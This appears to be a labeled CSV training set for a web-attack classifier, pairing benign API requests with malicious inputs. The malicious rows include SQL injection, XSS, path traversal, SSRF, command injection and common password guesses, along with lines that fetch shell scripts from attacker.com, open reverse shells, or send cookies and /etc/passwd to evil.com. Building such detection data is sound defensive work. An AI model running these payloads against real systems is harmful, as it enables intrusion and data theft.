"text","label"
"GET /api/swagger.json HTTP/1.1","1"
"username=administrator&password=batman","1"
"GET /api/users?id=' UNION SELECT NULL,NULL--","1"
"user_id=500&action=view","0"
"password spray attack detected multiple users","1"
"POST /api/users User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"user_id=97&action=view","0"
"GET /api/products/6863","0"
"POST /api/data body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Authorization: Bearer validtoken740","0"
"search=tablet","0"
"url=dict://127.0.0.1:11211/","1"
"GET /.git/config HTTP/1.1","1"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"page=35&limit=50","0"
"GET /console HTTP/1.1","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /.env HTTP/1.1","1"
"search=laptop","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /profile/5410","0"
"GET /api/swagger.json HTTP/1.1","1"
"username=' UNION SELECT username,password FROM users--","1"
"order_id=ORD-4631 status=confirmed","0"
"GET /api/search/7214","0"
"username=admin&password=abc123","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"POST /profile body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"exec=`curl -s http://attacker.com/shell.sh | bash`","1"
"page=14&limit=10","0"
"GET /api/users?id=' OR '1'='1","1"
"filename=; cat /etc/shadow","1"
"username=1' AND SLEEP(5)--","1"
"POST /dashboard body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"POST /api/feedback body=<script >alert(1)</script >","1"
"page=46&limit=50","0"
"cmd=| cat /etc/passwd","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"url=http://127.0.0.1/admin","1"
"<input onfocus=alert(1) autofocus>","1"
"comment=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"order_id=ORD-7035 status=confirmed","0"
"DELETE /api/search User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"category=phones page=1","0"
"order_id=ORD-3826 status=confirmed","0"
"comment=""><script>alert(1)</script>","1"
"filename=| cat /etc/passwd","1"
"GET /health HTTP/1.1","0"
"login attempt failed username admin invalid credentials","1"
"name=Ahmed email=16@mail.com","0"
"user_id=751&action=view","0"
"multiple failed login attempts detected for admin","1"
"POST /api/feedback body=javascript:alert(document.cookie)","1"
"' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"include=../../../../var/log/apache2/access.log","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /dashboard/9967","0"
"GET /api/orders User-Agent: python-requests/2.31.0","0"
"file=/etc/passwd%00","1"
"user_id=15&action=view","0"
"POST /dashboard?search=laptop&sort=price","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"filename=$(whoami)","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"name=Nour email=691@mail.com","0"
"file=../../../../etc/shadow","1"
"name=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"filename=`curl -s http://attacker.com/shell.sh | bash`","1"
"search=1'/**/OR/**/1=1--","1"
"url=dict://127.0.0.1:11211/","1"
"limit=20&offset=0","0"
"page=17&limit=20","0"
"<img src='x' onerror='alert(1)'>","1"
"search=<img src=x onerror=alert(1)>","1"
"GET /settings/3030","0"
"GET /health HTTP/1.1","0"
"comment=<img src='x' onerror='alert(1)'>","1"
"url=http://10.0.0.1","1"
"login attempt failed username admin invalid credentials","1"
"Authorization: Bearer validtoken994","0"
"name=Lina email=738@mail.com","0"
"search=laptop&sort=price","0"
"POST /api/data body=command& whoami","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=http://metadata.google.internal","1"
"page=2&limit=10","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"user_id=807&action=view","0"
"DELETE /settings?q=smartphone&brand=samsung","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"' OR ''='","1"
"category=tablets page=4","0"
"include=../../../../proc/self/environ","1"
"GET /health HTTP/1.1","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"exec=; python -c 'import socket,subprocess'","1"
"PUT /api/search User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /api/login/1851","0"
"user=' OR 'x'='x","1"
"url=file:///etc/passwd","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"search=phone","0"
"username=' OR '1'='1","1"
"PUT /settings User-Agent: python-requests/2.31.0","0"
"filename=; python -c 'import socket,subprocess'","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"POST /settings body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/users?search=laptop&sort=price","0"
"message=javascript:alert(document.cookie)","1"
"DELETE /dashboard?status=pending&priority=high","0"
"name=javascript:alert(1)","1"
"order_id=ORD-8903 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=phones page=1","0"
"name=Lina email=12@mail.com","0"
"login attempt failed username admin invalid credentials","1"
"POST /api/feedback body=<audio src=1 onerror=alert(1)>","1"
"GET /console HTTP/1.1","1"
"Authorization: Bearer validtoken627","0"
"user_id=991&action=view","0"
"GET /api/users?id=1' oR '1'='1","1"
"username=user&password=qwerty","1"
"brute force attempt on login endpoint from single ip","1"
"name=Ahmed email=486@mail.com","0"
"page=27&limit=20","0"
"multiple failed login attempts detected for admin","1"
"search=headphones","0"
"GET /health HTTP/1.1","0"
"POST /api/data body=command& whoami","1"
"page=13&limit=10","0"
"order_id=' OR '1'='1'--","1"
"user_id=961&action=view","0"
"username=1 AND 1=CONVERT(int,@@version)--","1"
"GET /api/data User-Agent: python-requests/2.31.0","0"
"comment=<body onload=alert(1)>","1"
"category=laptops page=2","0"
"DELETE /api/users User-Agent: PostmanRuntime/7.36.0","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"host=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"POST /settings body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"....//....//etc/passwd","1"
"GET /backup.sql HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"password spray attack detected multiple users","1"
"filename=; ping -c 4 attacker.com","1"
"status=pending&priority=high","0"
"GET /api/files?name=../../../etc/shadow","1"
"name=Nour email=926@mail.com","0"
"name=Lina email=796@mail.com","0"
"user_id=322&action=view","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"title=<iframe src=javascript:alert(1)>","1"
"GET /phpmyadmin HTTP/1.1","1"
"Authorization: Bearer validtoken227","0"
"GET /.git/config HTTP/1.1","1"
"DELETE /api/products User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"category=phones page=6","0"
"GET /api/search?q='><script>alert(1)</script>","1"
"POST /api/orders body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"name=Sara email=392@mail.com","0"
"GET /health HTTP/1.1","0"
"order_id=ORD-7470 status=confirmed","0"
"multiple failed login attempts detected for admin","1"
"GET /api/files?name=../../../../etc/passwd","1"
"fetch=http://internal-service:8080/secret","1"
"url=dict://127.0.0.1:11211/","1"
"GET /wp-admin HTTP/1.1","1"
"POST /api/products User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"host=`curl -s http://attacker.com/shell.sh | bash`","1"
"comment=<script>alert('XSS')</script>","1"
"cmd=| wget http://attacker.com/shell.sh","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"message=<img src=x onerror=alert(1)>","1"
"order_id=1'	OR	1=1--","1"
"host=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"POST /api/data body=command$(curl -s http://attacker.com/shell.sh)","1"
"host=$(curl -s http://attacker.com/shell.sh)","1"
"GET /server-status HTTP/1.1","1"
"order_id=ORD-8277 status=confirmed","0"
"name=Lina email=961@mail.com","0"
"'; WAITFOR DELAY '0:0:5'--","1"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"limit=20&offset=0","0"
"category=audio page=3","0"
"GET /etc/passwd%00","1"
"POST /settings?limit=20&offset=0","0"
"url=http://10.0.0.1","1"
"ping=; python -c 'import socket,subprocess'","1"
"message=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"1' AND SLEEP(5)--","1"
"limit=20&offset=0","0"
"DELETE /api/search?status=pending&priority=high","0"
"order_id=ORD-4484 status=confirmed","0"
"GET /health HTTP/1.1","0"
"username=administrator&password=admin","1"
"User-Agent: Nikto/2.5.0","1"
"GET /.env HTTP/1.1","1"
"page=30&limit=10","0"
"POST /api/data body=command| cat /etc/passwd","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/feedback body=<img src=`javascript:alert(1)`>","1"
"GET /api/login/990","0"
"path=../../../../etc/passwd","1"
"GET /actuator/env HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"file=/etc/passwd%00","1"
"GET /profile/2333","0"
"id='; WAITFOR DELAY '0:0:5'--","1"
"login attempt failed username admin invalid credentials","1"
"POST /api/users body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"url=gopher://127.0.0.1:25/","1"
"PUT /api/products?id=123&format=json","0"
"PUT /api/search?q=smartphone&brand=samsung","0"
"filename=|| nc -e /bin/sh attacker.com 4444","1"
"username=admin&password=letmein","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"username=user&password=admin123","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"page=6&limit=50","0"
"name=Sara email=862@mail.com","0"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /health HTTP/1.1","0"
"POST /dashboard User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"date=2024-01-15&type=order","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"DELETE /api/login?status=pending&priority=high","0"
"user_id=961&action=view","0"
"order_id=ORD-4167 status=confirmed","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"name=javascript:alert(document.cookie)","1"
"username=root&password=1234567890","1"
"PUT /api/search User-Agent: python-requests/2.31.0","0"
"GET /api/data?search=laptop&sort=price","0"
"order_id=ORD-3474 status=confirmed","0"
"GET /api/products/7114","0"
"GET /health HTTP/1.1","0"
"; cat /etc/shadow","1"
"user_id=49&action=view","0"
"multiple failed login attempts detected for admin","1"
"category=tablets page=5","0"
"category=audio page=5","0"
"repeated authentication failure admin account locked","1"
"search=headphones","0"
"order_id=ORD-2733 status=confirmed","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/login username=1' /*!OR*/ 1=1-- password=test","1"
"status=pending&priority=high","0"
"title=<video src=1 onerror=alert(1)>","1"
"GET /backup.sql HTTP/1.1","1"
"GET /actuator/env HTTP/1.1","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/users?id=id=1&id=2 UNION SELECT 1,2--","1"
"username=admin&password=qwerty","1"
"user=ahmed&filter=active","0"
"GET /health HTTP/1.1","0"
"user_id=786&action=view","0"
"GET /dashboard/1413","0"
"file=../../../var/www/html/config.php","1"
"GET /admin HTTP/1.1","1"
"order_id=ORD-3000 status=confirmed","0"
"search=laptop","0"
"GET /api/orders User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"path=../../../../etc/passwd","1"
"name=Sara email=415@mail.com","0"
"order_id=ORD-2580 status=confirmed","0"
"exec=$(whoami)","1"
"date=2024-01-15&type=order","0"
"POST /api/feedback body=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=dict://127.0.0.1:11211/","1"
"id=') OR ('1'='1","1"
"order_id=ORD-8601 status=confirmed","0"
"GET /api/files?name=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"POST /api/feedback body=""><script>alert(1)</script>","1"
"description=<scr ipt>alert(1)</scr ipt>","1"
"POST /api/data body=command& net user hacker Password1 /add","1"
"ping=; python -c 'import socket,subprocess'","1"
"username=root&password=abc123","1"
"GET /actuator/env HTTP/1.1","1"
"GET /api/products/1583","0"
"search=<svg/onload=alert(1)>","1"
"User-Agent: Nikto/2.5.0","1"
"POST /api/data?id=123&format=json","0"
"ping=`curl -s http://attacker.com/shell.sh | bash`","1"
"GET /api/data/8391","0"
"name=Ahmed email=613@mail.com","0"
"user_id=392&action=view","0"
"POST /api/data User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"order_id=ORD-1568 status=confirmed","0"
"username=1; DROP TABLE users--","1"
"POST /settings body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"order_id=ORD-7616 status=confirmed","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=admin'--","1"
"exec=$(whoami)","1"
"GET /wp-admin HTTP/1.1","1"
"GET /api/users?id=' OR 1=1 LIMIT 1--","1"
"category=laptops page=1","0"
"ping=& ipconfig","1"
"username='; DELETE FROM orders WHERE 1=1--","1"
"GET /api/products/4258","0"
"GET /config.php HTTP/1.1","1"
"GET /api/files?name=../../.git/config","1"
"category=tablets page=4","0"
"host=& ipconfig","1"
"<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://10.0.0.1","1"
"login attempt failed username admin invalid credentials","1"
"username=admin&password=superman","1"
"brute force attempt on login endpoint from single ip","1"
"file=../../../.env","1"
"id=1'; EXEC xp_cmdshell('whoami')--","1"
"url=http://192.168.1.1","1"
"category=audio page=7","0"
"POST /api/feedback body=<video src=1 onerror=alert(1)>","1"
"GET /.git/config HTTP/1.1","1"
"GET /.git/config HTTP/1.1","1"
"name=Ahmed email=450@mail.com","0"
"POST /api/feedback body=<iframe src=javascript:alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"login attempt failed username admin invalid credentials","1"
"Authorization: Bearer validtoken559","0"
"category=laptops page=5","0"
"order_id=ORD-1671 status=confirmed","0"
"search=<details open ontoggle=alert(1)>","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken407","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"exec=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"path=file:///etc/passwd","1"
"include=../../../var/www/html/config.php","1"
"GET /api/data/9916","0"
"; cat /etc/shadow","1"
"GET /health HTTP/1.1","0"
"filename=$(whoami)","1"
"login attempt failed username admin invalid credentials","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"order_id=1'	OR	1=1--","1"
"url=http://10.0.0.1","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"url=http://localhost:8080","1"
"GET /settings User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"search=tablet","0"
"GET /api/search?q=<iframe src=javascript:alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=tablets page=7","0"
"category=laptops page=5","0"
